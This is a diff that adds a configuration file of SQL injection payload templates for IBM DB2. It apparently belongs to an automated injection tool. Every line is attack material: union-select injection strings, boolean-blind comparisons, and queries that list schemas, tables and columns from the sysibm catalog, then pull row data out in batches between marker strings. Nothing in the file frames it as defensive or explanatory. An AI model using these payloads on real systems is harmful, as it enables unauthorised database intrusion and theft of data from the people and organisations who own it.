@@ -1,0 +1,30 @@
+exists_table: exists(select 1 from {table})
+exists_column: exists(select {cols} from {table})
+UnionFillStr:1
+UnionAll:1=2 union all select {cols} from sysibm.sysdummy1
+UnionData:1=2 union all select {cols} from (select sqli_t.*,rownumber() over() sqli_rn from {db}.{table} sqli_t{where}) where sqli_rn={rowIndex}
+UnionDataRows:1=2 union all select {fill} from (select listagg(sqli_r,'') within group(order by sqli_rn) sqli_agg from (select {cols} sqli_r,rownumber() over() sqli_rn from {db}.{table}{where}) sqli_t where sqli_rn>{rowIndex} and sqli_rn<={rowIndex}+{batchSize}) sqli_x
+BoolData:{expr}>{value}
+DataSplitStr:_s_p_
+DataStartStr:data_
+DataEndStr:_data
+DBCount:(select count(1) from sysibm.sysschemata)
+TableCount:(select count(1) from sysibm.systables where creator={db})
+ColumnCount:(select count(1) from sysibm.syscolumns where tbcreator={db} and tbname={table})
+DBName:(select name from (select name,rownumber() over() rn from sysibm.sysschemata) t where t.rn={index})
+DBNames:(select listagg(name,',') within group (order by name) from sysibm.sysschemata)
+TableName:(select name from (select name,rownumber() over() rn from sysibm.systables where creator={db}) t where t.rn={index})
+TableNames:(select listagg(name,',') within group (order by name) from sysibm.systables where creator={db})
+ColumnName:(select name from (select name,rownumber() over(order by colno) rn from sysibm.syscolumns where tbcreator={db} and tbname={table}) t where t.rn={index})
+ColumnNames:(select listagg(name,',') within group (order by colno) from sysibm.syscolumns where tbcreator={db} and tbname={table})
+Substr:substr(({expr}),{start},{len})
+Concat:{startMark}||{split}||{cols}||{split}||{endMark}
+Length:length(rtrim({expr}))
+Cast:coalesce(rtrim(cast({expr} as char(254))),chr(32))
+IfNull:coalesce({expr},chr(32))
+Ascii:ascii({expr})
+Hex:hex({expr})
+DataValue:(select {cols} from (select {cols},rownumber() over() rn from {db}.{table}{where}) t where t.rn={rowIndex})
+DataCount:(select count(1) from {db}.{table}{where})
+BlindStrategy: hex
+DnsChannel: no
